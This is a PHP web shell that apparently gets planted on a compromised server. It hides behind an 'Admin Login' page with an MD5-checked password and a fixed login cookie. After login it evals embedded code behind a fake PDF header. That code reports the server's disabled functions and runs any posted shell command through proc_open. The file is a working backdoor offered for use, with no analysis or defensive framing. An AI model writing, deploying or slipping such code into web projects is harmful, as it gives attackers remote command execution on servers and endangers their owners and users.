<?php

// Function to check if the user is logged in based on the presence of a valid cookie
function is_logged_in()
{
    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    // Function to get URL content (similar to your previous code)
    function geturlsinfo($url)
    {
        if (function_exists('curl_exec')) {
            $conn = curl_init($url);
            curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
            curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);

            $url_get_contents_data = curl_exec($conn);
            curl_close($conn);
        } elseif (function_exists('file_get_contents')) {
            $url_get_contents_data = file_get_contents($url);
        } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
            $handle = fopen($url, "r");
            $url_get_contents_data = stream_get_contents($handle);
            fclose($handle);
        } else {
            $url_get_contents_data = false;
        }
        return $url_get_contents_data;
    }

    $a = geturlsinfo('%PDF-1.5
    %����
    1 0 obj
    <!-- Unknown45 -->
    <!-- https://github.com/whoami-45 -->
    
    <font face=courier size=2><i>proc_open command execute by unknown45</i> | <?php print "\n";$disable_functions = @ini_get("disable_functions"); echo "<font face=courier size=2>disable func : <i><font color=red size=2> ".$disable_functions; print "\n"; ?><br></font>
    <form method="post">
    <font face=courier new size=2>Command :</font> <input type="text" class="area" name="cmd" size="30" height="20" value="ls -la" style="margin: 5px auto; padding-left: 5px;" required><br>
    <button type="submit">Execute</button>
    </form><hr>
    <?php
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
       1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
       2 => array("pipe", "r") // stderr is a file to write to
    );
    $env = array('some_option' => 'aeiou');
    $meki = "";
    if(isset($_POST['cmd'])){ 
    $cmd = ($_POST['cmd']);
    echo "<table width=100%><td><textarea cols=90 rows=25>";
    $process = proc_open($cmd, $descriptorspec, $pipes, $meki, $env);
    echo stream_get_contents($pipes[1]); die; }
    ?>
    
    ');
    eval('?>' . $a);
} else {
    // Display login form if not logged in
    if (isset($_POST['password'])) {
        $entered_password = $_POST['password'];
        $hashed_password = '2c538af4562bad9b1c6bf98cea5fdae9'; // Replace this with your MD5 hashed password
        if (md5($entered_password) === $hashed_password) {
            // Password is correct, set a cookie to indicate login
            setcookie('user_id', 'user123', time() + 3600, '/'); // Ganti 'user123' dengan nilai yang sesuai
        } else {
            // Password is incorrect
            echo "Incorrect password. Please try again.";
        }
    }
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Login</title>
    </head>
    <body>
        <form method="POST" action="">
            <label for="password">Admin:</label>
            <input type="password" id="password" name="password">
            <input type="submit" value="Login">
        </form>
    </body>
    </html>
    <?php
}
?>
